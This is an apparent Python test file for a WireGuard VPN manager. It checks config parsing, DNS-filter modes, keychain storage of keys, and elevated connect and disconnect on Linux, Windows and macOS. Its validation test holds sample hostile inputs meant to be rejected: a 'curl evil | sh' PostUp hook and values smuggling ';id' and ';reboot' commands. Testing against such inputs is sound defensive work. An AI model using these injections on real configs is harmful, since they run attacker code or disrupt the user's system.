import base64
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

from openpath.wireguard import DeviceVPN, apple_script_command, parse_config, render_config

KEY = base64.b64encode(bytes([1]) * 32).decode()
PEER = base64.b64encode(bytes([2]) * 32).decode()
SAMPLE = f"""[Interface]
PrivateKey = {KEY}
Address = 10.66.0.2/32, fd42:42::2/128
DNS = 1.1.1.1

[Peer]
PublicKey = {PEER}
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0, ::/0
"""


class FakeKeychain:
    def __init__(self):
        self.data = None

    def read(self):
        if self.data is None:
            raise ValueError("Import a WireGuard profile first")
        return self.data

    def write(self, data):
        self.data = data

    def remove(self):
        self.data = None


class WireGuardTests(unittest.TestCase):
    def test_validation_and_dns_policies(self):
        profile = parse_config(SAMPLE)
        self.assertEqual(profile.endpoint, "vpn.example.com:51820")
        self.assertIn("DNS = 94.140.14.14, 94.140.15.15", render_config(profile, {"dnsMode": "ads"}))
        self.assertIn("DNS = 9.9.9.9, 149.112.112.112", render_config(profile, {"dnsMode": "malware"}))
        self.assertIn("DNS = 10.66.0.1, 1.1.1.1", render_config(profile, {"dnsMode": "custom", "customDns": "10.66.0.1, 1.1.1.1"}))
        for config in (
            SAMPLE.replace("[Peer]", "PostUp = curl evil | sh\n[Peer]"),
            SAMPLE.replace("[Peer]", "Table = off\n[Peer]"),
            SAMPLE.replace("0.0.0.0/0, ::/0", "0.0.0.0/0"),
            SAMPLE.replace("vpn.example.com:51820", "vpn.example.com:51820;id"),
            SAMPLE.replace(KEY, "not-a-key"),
            SAMPLE + f"\n[Peer]\nPublicKey = {PEER}\n",
        ):
            with self.subTest(config=config[-50:]), self.assertRaises(ValueError):
                parse_config(config)
        with self.assertRaisesRegex(ValueError, "Custom DNS"):
            render_config(profile, {"dnsMode": "custom", "customDns": "1.1.1.1;reboot"})

    def test_linux_import_connect_dns_disconnect_and_secret_cleanup(self):
        with tempfile.TemporaryDirectory() as root:
            source = Path(root) / "source.conf"
            source.write_text(SAMPLE)
            active = False
            started_config = ""
            calls = []

            def run(args, **kwargs):
                nonlocal active, started_config
                calls.append(args)
                if args[0].endswith("/ip"):
                    if not active:
                        raise RuntimeError('Device "opvpn0" does not exist.')
                    return "42: opvpn0: <POINTOPOINT,UP> mtu 1420"
                if args[0].endswith(("/pkexec", "/wg-quick")):
                    action, filename = (args[-2], args[-1])
                    config = Path(filename).read_text()
                    self.assertEqual(Path(filename).name, "opvpn0.conf")
                    if action == "up":
                        started_config, active = config, True
                    else:
                        self.assertIn("DNS = 94.140.14.14", config)
                        self.assertNotIn("PrivateKey", config)
                        active = False
                    return ""
                raise AssertionError(args)

            store = FakeKeychain()
            vpn = DeviceVPN(root, platform="linux", keychain=store, find=lambda c: c[0], run=run)
            result = vpn.import_file(source)
            self.assertTrue(result["hasIPv6Address"])
            self.assertNotIn(KEY, vpn.metadata.read_text())
            self.assertEqual(vpn.connect({"dnsMode": "ads"})["state"], "active")
            self.assertIn("DNS = 94.140.14.14", started_config)
            self.assertFalse(any(p.name.startswith("wg-") for p in vpn.directory.iterdir()))
            with self.assertRaisesRegex(RuntimeError, "Disconnect"):
                vpn.import_file(source)
            store.read = lambda: (_ for _ in ()).throw(RuntimeError("keychain locked"))
            self.assertEqual(vpn.disconnect()["state"], "inactive")
            self.assertFalse(vpn.status()["owned"])
            vpn.remove_profile()
            self.assertFalse(vpn.status()["configured"])
            self.assertTrue(any(args[0].endswith(("/pkexec", "/wg-quick")) for args in calls))

    def test_windows_service_config_is_protected_and_removed(self):
        with tempfile.TemporaryDirectory() as root:
            source = Path(root) / "source.conf"
            source.write_text(SAMPLE)
            active = False
            protected = False
            config_file = None

            def run(args, **kwargs):
                nonlocal active, protected, config_file
                script = args[-1]
                if "Directory]::GetAccessControl" in script:
                    protected = True
                    self.assertIn("SetAccessRuleProtection($true,$false)", script)
                    self.assertIn("S-1-5-18", script)
                    return ""
                if "Get-Service" in script:
                    return "Running" if active else "absent"
                if "Start-Process" in script:
                    self.assertTrue(protected)
                    self.assertIn("$ErrorActionPreference='Stop'", script)
                    env = kwargs["env"]
                    if env["OPVPN_ACTION"] == "/installtunnelservice":
                        config_file = Path(env["OPVPN_ARGUMENT"])
                        self.assertIn("DNS = 9.9.9.9", config_file.read_text())
                        active = True
                    else:
                        self.assertEqual(env["OPVPN_ARGUMENT"], "opvpn0")
                        active = False
                    return ""
                raise AssertionError(args)

            store = FakeKeychain()
            vpn = DeviceVPN(root, platform="win32", keychain=store, find=lambda c: c[0], run=run)
            vpn.import_file(source)
            self.assertEqual(vpn.connect({"dnsMode": "malware"})["state"], "active")
            self.assertTrue(config_file.exists())
            store.read = lambda: (_ for _ in ()).throw(RuntimeError("keychain unavailable"))
            self.assertEqual(vpn.disconnect()["state"], "inactive")
            self.assertFalse(config_file.exists())

    def test_failed_start_does_not_claim_another_clients_interface(self):
        with tempfile.TemporaryDirectory() as root:
            source = Path(root) / "source.conf"
            source.write_text(SAMPLE)
            active = False

            def run(args, **_):
                nonlocal active
                if args[0].endswith("/ip"):
                    if active:
                        return "42: opvpn0: <POINTOPOINT,UP> mtu 1420"
                    raise RuntimeError('Device "opvpn0" does not exist.')
                active = True
                raise RuntimeError("Interface already exists")

            vpn = DeviceVPN(root, platform="linux", keychain=FakeKeychain(), find=lambda c: c[0], run=run)
            vpn.import_file(source)
            with self.assertRaisesRegex(RuntimeError, "already exists"):
                vpn.connect()
            self.assertFalse(vpn.status()["owned"])
            with self.assertRaisesRegex(RuntimeError, "not started by OpenPath"):
                vpn.disconnect()

    def test_replaced_linux_interface_is_not_treated_as_owned(self):
        with tempfile.TemporaryDirectory() as root:
            source = Path(root) / "source.conf"
            source.write_text(SAMPLE)
            state = {"active": False, "index": 42}

            def run(args, **_):
                if args[0].endswith("/ip"):
                    if not state["active"]:
                        raise RuntimeError('Device "opvpn0" does not exist.')
                    return f'{state["index"]}: opvpn0: <UP> mtu 1420'
                state["active"] = True
                return ""

            vpn = DeviceVPN(root, platform="linux", keychain=FakeKeychain(), find=lambda c: c[0], run=run)
            vpn.import_file(source)
            self.assertTrue(vpn.connect()["owned"])
            state["index"] = 43  # Original interface was removed/replaced.
            self.assertFalse(vpn.status()["owned"])
            with self.assertRaisesRegex(RuntimeError, "not started by OpenPath"):
                vpn.disconnect()

    def test_start_success_without_interface_is_not_reported_as_connected(self):
        with tempfile.TemporaryDirectory() as root:
            source = Path(root) / "source.conf"
            source.write_text(SAMPLE)

            def run(args, **_):
                if args[0].endswith("/ip"):
                    raise RuntimeError('Device "opvpn0" does not exist.')
                return ""

            vpn = DeviceVPN(root, platform="linux", keychain=FakeKeychain(), find=lambda c: c[0], run=run)
            vpn.import_file(source)
            with self.assertRaisesRegex(RuntimeError, "did not report an active"):
                vpn.connect()
            self.assertFalse(vpn.status()["owned"])

    def test_macos_uses_quoted_elevated_command_and_tracks_interface(self):
        command = apple_script_command('/opt/homebrew/bin/wg-quick', 'up', "/Users/O'Brien/opvpn0.conf")
        self.assertTrue(command.startswith("do shell script "))
        self.assertTrue(command.endswith("with administrator privileges"))
        with tempfile.TemporaryDirectory() as root:
            wg_dir = Path(root) / "run"
            wg_dir.mkdir()
            source = Path(root) / "source.conf"
            source.write_text(SAMPLE)
            active = False

            def run(args, **_):
                nonlocal active
                if args[0] == "/sbin/ifconfig":
                    if active:
                        return ""
                    raise RuntimeError("missing")
                if args[0] == "/usr/bin/osascript":
                    self.assertIn("with administrator privileges", args[-1])
                    if " up " in args[-1] or "'up'" in args[-1]:
                        active = True
                        (wg_dir / "opvpn0.name").write_text("utun123")
                    else:
                        active = False
                        (wg_dir / "opvpn0.name").unlink()
                    return ""
                raise AssertionError(args)

            vpn = DeviceVPN(root, platform="darwin", keychain=FakeKeychain(), find=lambda c: c[0], run=run, wireguard_dir=wg_dir)
            vpn.import_file(source)
            self.assertEqual(vpn.connect()["state"], "active")
            self.assertEqual(vpn.disconnect()["state"], "inactive")

    def test_windows_does_not_delete_config_if_removal_is_unconfirmed(self):
        with tempfile.TemporaryDirectory() as root:
            source = Path(root) / "source.conf"
            source.write_text(SAMPLE)
            state = "absent"
            config_file = None

            def run(args, **kwargs):
                nonlocal state, config_file
                script = args[-1]
                if "Directory]::GetAccessControl" in script:
                    return ""
                if "Get-Service" in script:
                    return state
                if "Start-Process" in script:
                    if kwargs["env"]["OPVPN_ACTION"] == "/installtunnelservice":
                        config_file = Path(kwargs["env"]["OPVPN_ARGUMENT"])
                        state = "Running"
                    else:
                        state = "Stopped"
                    return ""
                raise AssertionError(args)

            vpn = DeviceVPN(root, platform="win32", keychain=FakeKeychain(), find=lambda c: c[0], run=run)
            vpn.import_file(source)
            vpn.connect()
            with self.assertRaisesRegex(RuntimeError, "did not confirm"):
                vpn.disconnect()
            self.assertTrue(vpn.status()["owned"])
            self.assertTrue(config_file.exists())

    @unittest.skipUnless(sys.platform == "win32", "Requires Windows ACLs")
    def test_real_windows_directory_acl_is_protected(self):
        with tempfile.TemporaryDirectory() as root:
            vpn = DeviceVPN(root, platform="win32", keychain=FakeKeychain())
            vpn.init_dir()
            script = ("$a=Get-Acl $env:OPVPN_DIRECTORY; "
                      "$a.AreAccessRulesProtected; "
                      "$a.Access | ForEach-Object { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value }")
            output = subprocess.run([vpn.windows_tool("powershell"), "-NoProfile", "-NonInteractive", "-Command", script],
                                    env={**os.environ, "OPVPN_DIRECTORY": str(vpn.directory)}, capture_output=True, text=True, check=True).stdout
            self.assertTrue(output.strip().lower().startswith("true"), repr(output))
            self.assertIn("S-1-5-18", output)
            self.assertNotIn("S-1-1-0", output)  # Everyone

    @unittest.skipUnless(sys.platform == "darwin", "Requires macOS AppleScript")
    def test_real_applescript_compiles_without_elevation(self):
        with tempfile.TemporaryDirectory() as root:
            script = apple_script_command("/opt/homebrew/bin/wg-quick", "up", str(Path(root) / "O'Brien Ω" / "opvpn0.conf"))
            subprocess.run(["/usr/bin/osacompile", "-o", str(Path(root) / "test.scpt"), "-e", script],
                           capture_output=True, text=True, check=True)

    def test_profile_never_stored_when_keychain_fails(self):
        with tempfile.TemporaryDirectory() as root:
            source = Path(root) / "source.conf"
            source.write_text(SAMPLE)
            store = FakeKeychain()
            store.write = lambda _: (_ for _ in ()).throw(RuntimeError("system keychain required"))

            def run(args, **_):
                raise RuntimeError('Device "opvpn0" does not exist.')

            vpn = DeviceVPN(root, platform="linux", keychain=store, find=lambda c: c[0], run=run)
            with self.assertRaisesRegex(RuntimeError, "keychain"):
                vpn.import_file(source)
            self.assertFalse(vpn.metadata.exists())
            self.assertFalse(any(KEY in p.read_text() for p in vpn.directory.iterdir()))


if __name__ == "__main__":
    unittest.main()
